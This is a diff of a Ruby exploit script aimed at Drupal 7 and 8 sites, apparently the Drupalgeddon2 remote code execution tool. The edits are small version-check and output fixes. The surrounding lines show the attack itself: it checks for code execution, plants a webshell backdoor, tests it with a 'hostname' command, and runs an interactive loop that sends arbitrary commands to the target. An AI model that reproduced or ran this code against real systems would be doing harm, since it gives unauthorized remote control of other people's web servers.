@@ -202,10 +202,9 @@ if $drupalverion
   puts "[+] Drupal#{status}: #{$drupalverion}"
 else
   puts "[!] Didn't detect Drupal version"
-  puts "[!] Forcing Drupal v8.x attack"
-  $drupalverion = "8.x"
+  exit
 end
-if not $drupalverion.start_with?("7") and not $drupalverion.start_with?("8")
+if not $drupalverion.start_with?("8") and not $drupalverion.start_with?("7")
   puts "[!] Unsupported Drupal version"
   exit
 end
@@ -231,6 +230,7 @@ if response.code == "200" and not response.body.empty?
     puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[i] Target might to be exploitable (1)...   Detect output, but didn't match expected result"
   else
     puts "[i] Target might to be exploitable (2)...   Didn't detect any output (disabled PHP function?)"
+  end
 else
   puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
   exit
@@ -265,7 +265,7 @@ paths.each do|path|
   if response.code == "200" and not response.body.empty?
     # Feedback
     result = clean_result(response.body)
-    puts "[+] Result : #{result}"
+    puts "[+] Result : #{result}" if not response.body.empty?
 
     # Test to see if backdoor is there (if we managed to write it)
     response = http_request("#{$target}#{webshellpath}", "post", "c=hostname")
@@ -301,7 +301,7 @@ trap("INT", "SIG_IGN")
 # Forever loop
 loop do
   # Default value
-  result = "ERROR"
+  result = "~ERROR~"
 
   # Get input
   command = Readline.readline("#{prompt}>> ", true).to_s
@@ -320,6 +320,8 @@ loop do
   else
     url, payload = gen_evil_url(command, false)
     response = http_request(url, "post", payload)
+
+    # Check result
     if response.code == "200" and not response.body.empty?
       result = clean_result(response.body)
     end
